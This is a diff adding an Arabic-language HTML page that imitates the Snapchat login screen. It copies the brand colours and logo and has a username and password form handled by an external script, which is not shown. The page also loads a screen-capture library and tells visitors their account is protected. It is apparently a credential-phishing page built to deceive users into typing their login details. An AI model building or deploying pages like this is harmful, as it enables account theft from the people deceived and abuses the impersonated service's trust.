@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>Snapchat - تسجيل الدخول</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      background-color: #fffc00;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    .container {
+      max-width: 380px;
+      margin: 60px auto;
+      background: white;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .logo {
+      width: 70px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin-bottom: 25px;
+      color: #333;
+      font-size: 22px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 16px;
+      text-align: right;
+    }
+
+    button {
+      width: 95%;
+      padding: 14px;
+      background: #000;
+      color: #fffc00;
+      border: none;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #111;
+    }
+
+    .note {
+      font-size: 13px;
+      color: gray;
+      margin-top: 18px;
+    }
+
+    #statusMsg {
+      display: none;
+      margin-top: 15px;
+      font-size: 14px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1024px-Snapchat_logo.svg.png" alt="Snapchat">
+    <h2>تسجيل الدخول إلى Snapchat</h2>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <input type="text" id="username" placeholder="اسم المستخدم" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button type="submit">تسجيل الدخول</button>
+    </form>
+    <p class="note">🔒 حسابك محمي. تأكد من صحة المعلومات.</p>
+    <p id="statusMsg"></p>
+  </div>
+
+  <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+  <script src="/static/script.js"></script>
+</body>
+</html>
